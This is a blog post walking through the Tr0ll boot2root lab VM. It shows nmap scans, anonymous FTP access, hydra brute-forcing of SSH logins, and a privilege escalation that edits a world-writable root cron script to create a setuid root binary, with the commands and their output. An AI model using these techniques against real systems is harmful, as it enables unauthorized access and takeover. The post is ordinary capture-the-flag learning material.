<!DOCTYPE html>
<html lang="en-us">
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title> taming the troll | #!/slash/note</title>
  <meta name="description" content="[&#39;Caffeine fueled&#39;, &#39;(╯°□°)╯︵ ┻━┻&#39;, &#39;Security guy&#39;, &#39;Metalhead&#39;, &#39;I saw your password&#39;, &#39;KOOBo&#43;KXleKAv&#43;KXlSnjgaM=&#39;]">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="robots" content="all,follow">
  <meta name="googlebot" content="index,follow,snippet,archive">
  <meta property="og:title" content="taming the troll" />
<meta property="og:description" content="foreword
Having recently started the road to OSCP, @Maleus21 released Tr0ll on @VulnHub. I figured since the description was Difficulty: Beginner ; Type: boot2root, I could give it a smash in a evening as a bit of distraction." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://leonjza.github.io/blog/2014/08/15/taming-the-troll/" />
<meta property="article:published_time" content="2014-08-15T07:12:03+00:00" />
<meta property="article:modified_time" content="2014-08-15T07:12:03+00:00" />

  <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="taming the troll"/>
<meta name="twitter:description" content="foreword
Having recently started the road to OSCP, @Maleus21 released Tr0ll on @VulnHub. I figured since the description was Difficulty: Beginner ; Type: boot2root, I could give it a smash in a evening as a bit of distraction."/>

  
  
  
  <link rel="stylesheet" href="https://leonjza.github.io/css/style-white.css">
  
  
  
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
  

  
<link rel="icon" type="image/png" href="https://leonjza.github.io/images/favicon.png" />

  
  
  
  
  
    
<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
	ga('create', 'UA-44457032-2', 'auto');
	
	ga('send', 'pageview');
}
</script>
<script async src='https://www.google-analytics.com/analytics.js'></script>

  
  
</head>

<body class="max-width mx-auto px3 ltr">
  <div class="content index py4">

    <header id="header">
  <a href="https://leonjza.github.io">
  
    <div id="logo" style="background-image: url(https://leonjza.github.io/images/logo.png)"></div>
  
  <div id="title">
    <h1>#!/slash/note</h1>
  </div>
  </a>
  <div id="nav">
    <ul>
      <li class="icon">
        <a href="#"><i class="fas fa-bars fa-2x"></i></a>
      </li>
      
        <li><a href="https://leonjza.github.io/">Home</a></li>
      
        <li><a href="https://leonjza.github.io/about/">About Me</a></li>
      
    </ul>
  </div>
</header>



    
<article class="post" itemscope itemtype="http://schema.org/BlogPosting">

  <div class="content" itemprop="articleBody">
  
    <h2 id="foreword">foreword</h2>
<p>Having recently started the road to <a href="http://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/">OSCP</a>, <a href="https://twitter.com/Maleus21">@Maleus21</a> released <a href="http://vulnhub.com/entry/tr0ll-1,100/">Tr0ll</a> on <a href="https://twitter.com/VulnHub">@VulnHub</a>. I figured since the description was <em>Difficulty: Beginner ; Type: boot2root</em>, I could give it a smash in a evening as a bit of distraction.</p>
<h2 id="nomad-promise">nomad, promise</h2>
<p>As usual, I downloaded the VM, extracted the <code>.rar</code> and slapped it in Virtual Box. I got the IP 192.168.56.101. Promptly a NMAP was run against it:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# nmap -v --reason -sV 192.168.56.101 -p-

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.2
22/tcp open  ssh     syn-ack <span style="color:#ff79c6">(</span>protocol 2.0<span style="color:#ff79c6">)</span>
80/tcp open  http    syn-ack Apache httpd 2.4.7 <span style="color:#ff79c6">((</span>Ubuntu<span style="color:#ff79c6">))</span>
</code></pre></div><p>So, <code>ssh</code>, <code>ftp</code>, and <code>http</code>. Naturally my first reaction was to inspect the web service.</p>
<figure>
    <img src="https://leonjza.github.io/images/troll_web.png"/> 
</figure>

<p>The <code>robots.txt</code> file revealed:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">User-agent:*
Disallow: /secret
</code></pre></div><p>Browsing to <code>/secret</code> revealed yet another <em>interesting</em> piece of art:</p>
<figure>
    <img src="https://leonjza.github.io/images/troll_secret_path.png"/> 
</figure>

<p>Right&hellip; A little early to be &lsquo;mad&rsquo;, but nonetheless, lets move on.</p>
<h2 id="anonny-mouse-ftp">anonny-mouse ftp</h2>
<p>A quick and lazy google for <code>vsftpd 3.0.2 exploit</code> didn&rsquo;t reveal anything interesting on page 1, so I lost interest pretty fast. I figured I can just try my luck and attempt to login to the FTP service with anonymous creds:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# ftp 192.168.56.101
Connected to 192.168.56.101.
<span style="color:#bd93f9">220</span> <span style="color:#ff79c6">(</span>vsFTPd 3.0.2<span style="color:#ff79c6">)</span>
Name <span style="color:#ff79c6">(</span>192.168.56.101:root<span style="color:#ff79c6">)</span>: anonymous
<span style="color:#bd93f9">331</span> Please specify the password.
Password:
<span style="color:#bd93f9">230</span> Login successful.
Remote system <span style="color:#8be9fd;font-style:italic">type</span> is UNIX.
Using binary mode to transfer files.

ftp&gt; ls
<span style="color:#bd93f9">500</span> Illegal PORT command.
ftp: bind: Address already in use

ftp&gt; passive
Passive mode on.

ftp&gt; ls
<span style="color:#bd93f9">227</span> Entering Passive Mode <span style="color:#ff79c6">(</span>192,168,56,101,231,190<span style="color:#ff79c6">)</span>
<span style="color:#bd93f9">150</span> Here comes the directory listing.
-rwxrwxrwx    <span style="color:#bd93f9">1</span> <span style="color:#bd93f9">1000</span>     <span style="color:#bd93f9">0</span>            <span style="color:#bd93f9">8068</span> Aug <span style="color:#bd93f9">10</span> 00:43 lol.pcap
<span style="color:#bd93f9">226</span> Directory send OK.

ftp&gt; get lol.pcap
local: lol.pcap remote: lol.pcap
<span style="color:#bd93f9">227</span> Entering Passive Mode <span style="color:#ff79c6">(</span>192,168,56,101,189,113<span style="color:#ff79c6">)</span>
<span style="color:#bd93f9">150</span> Opening BINARY mode data connection <span style="color:#ff79c6">for</span> lol.pcap <span style="color:#ff79c6">(</span><span style="color:#bd93f9">8068</span> bytes<span style="color:#ff79c6">)</span>.
<span style="color:#bd93f9">226</span> Transfer complete.
<span style="color:#bd93f9">8068</span> bytes received in 0.00 secs <span style="color:#ff79c6">(</span>21294.3 kB/s<span style="color:#ff79c6">)</span>

ftp&gt; bye
<span style="color:#bd93f9">221</span> Goodbye.
</code></pre></div><p>Well that worked, and showed that we have a file <code>lol.pcap</code> to look at. Interesting. I fired up wireshark and opened the pcap. Following the TCP streams it looked like in a previous session there was activity with a file called <code>secret_stuff.txt</code> that is no longer available. I filtered out that stream and continued down the rabbit hole, until I saw the message:</p>
<figure>
    <img src="https://leonjza.github.io/images/troll_pcap.png"/> 
</figure>

<p>Ok. Well. I tried a few things after this, until eventually I figured it may be a web path. Sooo, off to the website we went and browsed to http://192.168.56.101/sup3rs3cr3tdirlol/. In this path there was a binary  called <code>roflmao</code>. I downloaded the bin and did some static analysis (paranoid and all that) to see if I can figure out what it does before running it. Eventually I just made it executable and ran it:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# wget http://192.168.56.101/sup3rs3cr3tdirlol/roflmao
--2014-08-15 07:57:56--  http://192.168.56.101/sup3rs3cr3tdirlol/roflmao
Connecting to 192.168.56.101:80... connected.
HTTP request sent, awaiting response... <span style="color:#bd93f9">200</span> OK
Length: <span style="color:#bd93f9">7296</span> <span style="color:#ff79c6">(</span>7.1K<span style="color:#ff79c6">)</span>
Saving to: <span style="color:#f1fa8c">`</span>roflmao<span style="color:#f1fa8c">&#39;
</span><span style="color:#f1fa8c">
</span><span style="color:#f1fa8c">100%[======&gt;] 7,296       --.-K/s   in 0s
</span><span style="color:#f1fa8c">
</span><span style="color:#f1fa8c">2014-08-15 07:57:56 (826 MB/s) - `roflmao&#39;</span> saved <span style="color:#ff79c6">[</span>7296/7296<span style="color:#ff79c6">]</span>

root@kali:~/Desktop/Tr0ll# chmod +x roflmao
root@kali:~/Desktop/Tr0ll# ./roflmao
Find address 0x0856BF to proceed
</code></pre></div><p>Nice. <code>0x0856BF</code> is not exactly helpful. But what does it mean? From the previous analysis I have done it also looked like the bin is really just printing the string as can be seen above. After some poking around and exchanging ideas with <a href="https://twitter.com/barrebas">@barrebas</a> on IRC, I remembered that the previous vague hint was a directory on the web site. So, I tried http://192.168.56.101/0x0856BF/:</p>
<figure>
    <img src="https://leonjza.github.io/images/troll_0x856bf.png"/> 
</figure>

<h2 id="nohydraplz">nohydraplz</h2>
<p>Cool! At this stage I was pretty sure there was not much left to gain shell. The folder <code>good_luck</code> had a file called <code>which_one_lol.txt</code> with contents:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">maleus
ps-aux
felux
Eagle11
genphlux &lt; -- Definitely not this one
usmc8892
blawrg
wytshadow
vis1t0r
overflow
</code></pre></div><p>List of passwords? Dunno. The folder <code>this_folder_contains_the_password</code> had a file <code>Pass.txt</code> with contents:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">Good_job_:)
</code></pre></div><p>At this stage I figured this had to be either a nicely provided wordlist for some <code>hydra</code> action on the <code>ftp</code> || <code>ssh</code> service. So naturally, I copied the information to a file called <code>list.txt</code> (also made a copy of the <code>genphlux</code> word so that its on its own line), and fired up hydra on <code>ssh</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# hydra -v -V -u -L list -P list -t <span style="color:#bd93f9">1</span> -u 192.168.56.101 ssh
Hydra v7.6 <span style="color:#ff79c6">(</span>c<span style="color:#ff79c6">)</span><span style="color:#bd93f9">2013</span> by van Hauser/THC &amp; David Maciejak - <span style="color:#ff79c6">for</span> legal purposes only

<span style="color:#ff79c6">[</span>DATA<span style="color:#ff79c6">]</span> attacking service ssh on port <span style="color:#bd93f9">22</span>
<span style="color:#ff79c6">[</span>VERBOSE<span style="color:#ff79c6">]</span> Resolving addresses ... <span style="color:#ff79c6">done</span>
<span style="color:#ff79c6">[</span>ATTEMPT<span style="color:#ff79c6">]</span> target 192.168.56.101 - login <span style="color:#f1fa8c">&#34;maleus&#34;</span> - pass <span style="color:#f1fa8c">&#34;maleus&#34;</span> - <span style="color:#bd93f9">1</span> of <span style="color:#bd93f9">169</span> <span style="color:#ff79c6">[</span>child 0<span style="color:#ff79c6">]</span>
<span style="color:#ff79c6">[</span>ATTEMPT<span style="color:#ff79c6">]</span> target 192.168.56.101 - login <span style="color:#f1fa8c">&#34;ps-aux&#34;</span> - pass <span style="color:#f1fa8c">&#34;maleus&#34;</span> - <span style="color:#bd93f9">2</span> of <span style="color:#bd93f9">169</span> <span style="color:#ff79c6">[</span>child 0<span style="color:#ff79c6">]</span>
<span style="color:#ff79c6">[</span>ATTEMPT<span style="color:#ff79c6">]</span> target 192.168.56.101 - login <span style="color:#f1fa8c">&#34;felux&#34;</span> - pass <span style="color:#f1fa8c">&#34;maleus&#34;</span> - <span style="color:#bd93f9">3</span> of <span style="color:#bd93f9">169</span> <span style="color:#ff79c6">[</span>child 0<span style="color:#ff79c6">]</span>
<span style="color:#ff79c6">[</span>ATTEMPT<span style="color:#ff79c6">]</span> target 192.168.56.101 - login <span style="color:#f1fa8c">&#34;Eagle11&#34;</span> - pass <span style="color:#f1fa8c">&#34;maleus&#34;</span> - <span style="color:#bd93f9">4</span> of <span style="color:#bd93f9">169</span> <span style="color:#ff79c6">[</span>child 0<span style="color:#ff79c6">]</span>
<span style="color:#ff79c6">[</span>ATTEMPT<span style="color:#ff79c6">]</span> target 192.168.56.101 - login <span style="color:#f1fa8c">&#34;genphlux &lt; -- Definitely not this one&#34;</span> - pass <span style="color:#f1fa8c">&#34;maleus&#34;</span> - <span style="color:#bd93f9">5</span> of <span style="color:#bd93f9">169</span> <span style="color:#ff79c6">[</span>child 0<span style="color:#ff79c6">]</span>
<span style="color:#ff79c6">[</span>ATTEMPT<span style="color:#ff79c6">]</span> target 192.168.56.101 - login <span style="color:#f1fa8c">&#34;genphlux&#34;</span> - pass <span style="color:#f1fa8c">&#34;maleus&#34;</span> - <span style="color:#bd93f9">6</span> of <span style="color:#bd93f9">169</span> <span style="color:#ff79c6">[</span>child 0<span style="color:#ff79c6">]</span>
<span style="color:#ff79c6">[</span>ATTEMPT<span style="color:#ff79c6">]</span> target 192.168.56.101 - login <span style="color:#f1fa8c">&#34;usmc8892&#34;</span> - pass <span style="color:#f1fa8c">&#34;maleus&#34;</span> - <span style="color:#bd93f9">7</span> of <span style="color:#bd93f9">169</span> <span style="color:#ff79c6">[</span>child 0<span style="color:#ff79c6">]</span>

<span style="color:#ff79c6">[</span>ERROR<span style="color:#ff79c6">]</span> could not connect to target port <span style="color:#bd93f9">22</span>
<span style="color:#ff79c6">[</span>ERROR<span style="color:#ff79c6">]</span> ssh protocol error
<span style="color:#ff79c6">[</span>VERBOSE<span style="color:#ff79c6">]</span> Retrying connection <span style="color:#ff79c6">for</span> child <span style="color:#bd93f9">0</span>
<span style="color:#ff79c6">[</span>RE-ATTEMPT<span style="color:#ff79c6">]</span> target 192.168.56.101 - login <span style="color:#f1fa8c">&#34;usmc8892&#34;</span> - pass <span style="color:#f1fa8c">&#34;maleus&#34;</span> - <span style="color:#bd93f9">7</span> of <span style="color:#bd93f9">169</span> <span style="color:#ff79c6">[</span>child 0<span style="color:#ff79c6">]</span>

<span style="color:#ff79c6">[</span>ERROR<span style="color:#ff79c6">]</span> could not connect to target port <span style="color:#bd93f9">22</span>
<span style="color:#ff79c6">[</span>ERROR<span style="color:#ff79c6">]</span> ssh protocol error
<span style="color:#ff79c6">[</span>VERBOSE<span style="color:#ff79c6">]</span> Retrying connection <span style="color:#ff79c6">for</span> child <span style="color:#bd93f9">0</span>
<span style="color:#ff79c6">[</span>RE-ATTEMPT<span style="color:#ff79c6">]</span> target 192.168.56.101 - login <span style="color:#f1fa8c">&#34;usmc8892&#34;</span> - pass <span style="color:#f1fa8c">&#34;maleus&#34;</span> - <span style="color:#bd93f9">7</span> of <span style="color:#bd93f9">169</span> <span style="color:#ff79c6">[</span>child 0<span style="color:#ff79c6">]</span>
</code></pre></div><p>Err, the sudden errors only meant one thing&hellip; <code>fail2ban</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# nmap -v --reason -Pn 192.168.56.101 -p <span style="color:#bd93f9">22</span>

PORT   STATE    SERVICE REASON
22/tcp filtered ssh     no-response

</code></pre></div><p>So, this was the first part that frustrated me and had me going <em>&ldquo;seriously&hellip; :&quot;</em>. Maybe this was actually a list of <code>ftp</code> creds? Sadly, that did not seem to be the case either. And so I was stuck once again. Hydra was slowly trickling on once the ssh service was unbanned again, but it was annoying as heck.</p>
<h2 id="first-shell">first shell</h2>
<p>I kept bouncing the VM to get the ssh service back faster, allowing hydra to do it&rsquo;s <code>thing</code>. Eventually, it was apparent that none of these words as a username/password combination was the correct one.</p>
<p>Returning to the web interface and the word lists, I realized (with some subtle hints and reminders from @barrebas to <em>read</em> everything), that the password may be in this folder (<code>this_folder_contains_the_password</code>). Get it, the <code>Pass.txt</code> is the password&hellip;</p>
<p>Right, so I changed <code>hydra</code> slightly to use <code>Pass.txt</code> as a password and continued to brute with the original <code>list.txt</code> as usernames:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# hydra -v -V -u -L list -p <span style="color:#f1fa8c">&#34;Pass.txt&#34;</span> -t <span style="color:#bd93f9">1</span> -u 192.168.56.101 ssh
Hydra v7.6 <span style="color:#ff79c6">(</span>c<span style="color:#ff79c6">)</span><span style="color:#bd93f9">2013</span> by van Hauser/THC &amp; David Maciejak - <span style="color:#ff79c6">for</span> legal purposes only

<span style="color:#ff79c6">[</span>DATA<span style="color:#ff79c6">]</span> <span style="color:#bd93f9">1</span> task, <span style="color:#bd93f9">1</span> server, <span style="color:#bd93f9">13</span> login tries <span style="color:#ff79c6">(</span>l:13/p:1<span style="color:#ff79c6">)</span>, ~13 tries per task
<span style="color:#ff79c6">[</span>DATA<span style="color:#ff79c6">]</span> attacking service ssh on port <span style="color:#bd93f9">22</span>
<span style="color:#ff79c6">[</span>VERBOSE<span style="color:#ff79c6">]</span> Resolving addresses ... <span style="color:#ff79c6">done</span>
<span style="color:#ff79c6">[</span>ATTEMPT<span style="color:#ff79c6">]</span> target 192.168.56.101 - login <span style="color:#f1fa8c">&#34;maleus&#34;</span> - pass <span style="color:#f1fa8c">&#34;Pass.txt&#34;</span> - <span style="color:#bd93f9">1</span> of <span style="color:#bd93f9">13</span> <span style="color:#ff79c6">[</span>child 0<span style="color:#ff79c6">]</span>
<span style="color:#ff79c6">[</span>ATTEMPT<span style="color:#ff79c6">]</span> target 192.168.56.101 - login <span style="color:#f1fa8c">&#34;ps-aux&#34;</span> - pass <span style="color:#f1fa8c">&#34;Pass.txt&#34;</span> - <span style="color:#bd93f9">2</span> of <span style="color:#bd93f9">13</span> <span style="color:#ff79c6">[</span>child 0<span style="color:#ff79c6">]</span>
<span style="color:#ff79c6">[</span>ATTEMPT<span style="color:#ff79c6">]</span> target 192.168.56.101 - login <span style="color:#f1fa8c">&#34;felux&#34;</span> - pass <span style="color:#f1fa8c">&#34;Pass.txt&#34;</span> - <span style="color:#bd93f9">3</span> of <span style="color:#bd93f9">13</span> <span style="color:#ff79c6">[</span>child 0<span style="color:#ff79c6">]</span>
<span style="color:#ff79c6">[</span>...<span style="color:#ff79c6">]</span>
<span style="color:#ff79c6">[</span>22<span style="color:#ff79c6">][</span>ssh<span style="color:#ff79c6">]</span> host: 192.168.56.101   login: overflow   password: Pass.txt
</code></pre></div><p>Yay <code>overflow:Pass.txt</code> should get us a session via ssh:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~/Desktop/Tr0ll# ssh overflow@192.168.56.101
overflow@192.168.56.101&#39;s password:
Welcome to Ubuntu 14.04.1 LTS <span style="color:#ff79c6">(</span>GNU/Linux 3.13.0-32-generic i686<span style="color:#ff79c6">)</span>

<span style="color:#ff79c6">[</span>...<span style="color:#ff79c6">]</span>

Could not chdir to home directory /home/overflow: No such file or directory
$ id
<span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>1002<span style="color:#ff79c6">(</span>overflow<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">gid</span><span style="color:#ff79c6">=</span>1002<span style="color:#ff79c6">(</span>overflow<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">groups</span><span style="color:#ff79c6">=</span>1002<span style="color:#ff79c6">(</span>overflow<span style="color:#ff79c6">)</span>
</code></pre></div><h2 id="-and-root">&hellip; and root</h2>
<p>And so it was time for classic enumeration again. The first <em>strange</em> thing was the fact that it appeared as if all the <code>/home</code> directories apart from <code>/home/troll</code> was deleted. Weird. Other than that, there were a whole bunch of users according to <code>/etc/passwd</code>, and I can&rsquo;t run anything as <code>root</code> via <code>sudo</code>.</p>
<p>There was a file in <code>/opt/</code> called <code>lmao.py</code>, however I did not have access to read it. Soooo, more enumeration.</p>
<p><em>suddenly</em></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Broadcast Message from root@trol
        <span style="color:#ff79c6">(</span>somewhere<span style="color:#ff79c6">)</span> at 16:05 ...

TIMES UP LOL!

Connection to 192.168.56.101 closed by remote host.
Connection to 192.168.56.101 closed.
root@kali:~#
</code></pre></div><p>Urgh. Turns out, something is killing my ssh session every 5 minutes. <strong>Oh my word</strong>, was that annoying. I could handle everything the VM&rsquo;s offered, but this was probably the worst part of it.</p>
<p>Eventually, I was searching for executable files on the filesystem. I was filtering out a large chunk and gradually paging though results to find that odd one out. To help filter out uninteresting stuff, it looked like the VM was built in August, so I just grep for that in the results, hoping that the <em>thing</em> I should be finding has a more recent timestamp:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">overflow@troll:/$ find / -executable -type f 2&gt; /dev/null | egrep -v <span style="color:#f1fa8c">&#34;^/bin|^/var|^/etc|^/usr&#34;</span> | xargs ls -lh | grep Aug

-rwxrwxrwx <span style="color:#bd93f9">1</span> root  root    <span style="color:#bd93f9">145</span> Aug <span style="color:#bd93f9">14</span> 13:11 /lib/log/cleaner.py
-rwx--x--x <span style="color:#bd93f9">1</span> root  root    <span style="color:#bd93f9">117</span> Aug <span style="color:#bd93f9">10</span> 02:11 /opt/lmao.py
-rwxr-xr-x <span style="color:#bd93f9">1</span> root  root   2.4K Aug <span style="color:#bd93f9">27</span>  <span style="color:#bd93f9">2013</span> /sbin/installkernel
-rwxrwxrwx <span style="color:#bd93f9">1</span> troll root   7.9K Aug <span style="color:#bd93f9">10</span> 00:43 /srv/ftp/lol.pcap
</code></pre></div><p>A few interesting results came from that, however, the one that held the golden nugget was <code>/lib/log/cleaner.py</code>. During my enumeration I noticed that <code>/tmp</code> got cleaned out at a really strange time as I was still trying to <code>less</code> a file in there, however, it just <em>disappeared</em>.</p>
<p>Anyways, as <code>cleaner.py</code> was owned by root and running <code>os.system</code>, I just modified it to prepare me a classic <code>getroot</code> binary:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6272a4">#!/usr/bin/env python</span>
<span style="color:#ff79c6">import</span> os
<span style="color:#ff79c6">import</span> sys
<span style="color:#ff79c6">try</span>:
    os<span style="color:#ff79c6">.</span>system(<span style="color:#f1fa8c">&#39;chown root:root /var/tmp/getroot; chmod 4755 /var/tmp/getroot &#39;</span>)
<span style="color:#ff79c6">except</span>:
    sys<span style="color:#ff79c6">.</span>exit()
</code></pre></div><p>I waited for that annoying &lsquo;Times UP&rsquo; message, and inspected <code>/var/tmp</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">overflow@troll:/$ ls -lah /var/tmp/
total 24K
drwxrwxrwt  <span style="color:#bd93f9">2</span> root     root     4.0K Aug <span style="color:#bd93f9">14</span> 13:11 .
drwxr-xr-x <span style="color:#bd93f9">12</span> root     root     4.0K Aug <span style="color:#bd93f9">10</span> 03:56 ..
-rwxrwxrwx  <span style="color:#bd93f9">1</span> root     root       <span style="color:#bd93f9">34</span> Aug <span style="color:#bd93f9">13</span> 01:16 cleaner.py.swp
-rwsr-xr-x  <span style="color:#bd93f9">1</span> root     root     7.2K Aug <span style="color:#bd93f9">14</span> 13:09 getroot
-rw-rw-r--  <span style="color:#bd93f9">1</span> overflow overflow   <span style="color:#bd93f9">71</span> Aug <span style="color:#bd93f9">14</span> 13:09 sh.c

overflow@troll:/$ /var/tmp/getroot
<span style="color:#6272a4">#</span>
<span style="color:#6272a4"># id</span>
<span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">(</span>root<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">gid</span><span style="color:#ff79c6">=</span>1002<span style="color:#ff79c6">(</span>overflow<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">groups</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">(</span>root<span style="color:#ff79c6">)</span>,1002<span style="color:#ff79c6">(</span>overflow<span style="color:#ff79c6">)</span>

<span style="color:#6272a4"># ls /root</span>
proof.txt

<span style="color:#6272a4"># cat /root/proof.txt</span>
Good job, you did it!


702a8c18d29c6f3ca0d99ef5712bfbdc
<span style="color:#6272a4">#</span>
</code></pre></div><h2 id="for-the-curious">for the curious</h2>
<p>That really annoying session that keeps dying? Turns out its <code>/opt/lmao.py</code> to blame:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6272a4"># cat /opt/lmao.py</span>
<span style="color:#6272a4">#!/usr/bin/env python</span>
<span style="color:#ff79c6">import</span> os

os<span style="color:#ff79c6">.</span>system(<span style="color:#f1fa8c">&#39;echo &#34;TIMES UP LOL!&#34;|wall&#39;</span>)
os<span style="color:#ff79c6">.</span>system(<span style="color:#f1fa8c">&#34;pkill -u &#39;overflow&#39;&#34;</span>)
sys<span style="color:#ff79c6">.</span>exit()

<span style="color:#6272a4">#</span>
</code></pre></div><p>Thanks <a href="https://twitter.com/maleus21">@maleus21</a> for the VM!</p>
  
  </div>
</article>


    <footer id="footer">
  <div class="footer-left">
    Copyright  &copy; 2020  Leon Jacobs 
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
        <li><a href="https://leonjza.github.io/">Home</a></li>
         
        <li><a href="https://leonjza.github.io/about/">About Me</a></li>
        
      </ul>
    </nav>
  </div>
</footer>


  </div>
</body>

<link rel="stylesheet" href=https://leonjza.github.io/lib/font-awesome/css/all.min.css>
<script src=https://leonjza.github.io/lib/jquery/jquery.min.js></script>
<script src=https://leonjza.github.io/js/main.js></script>
</html>
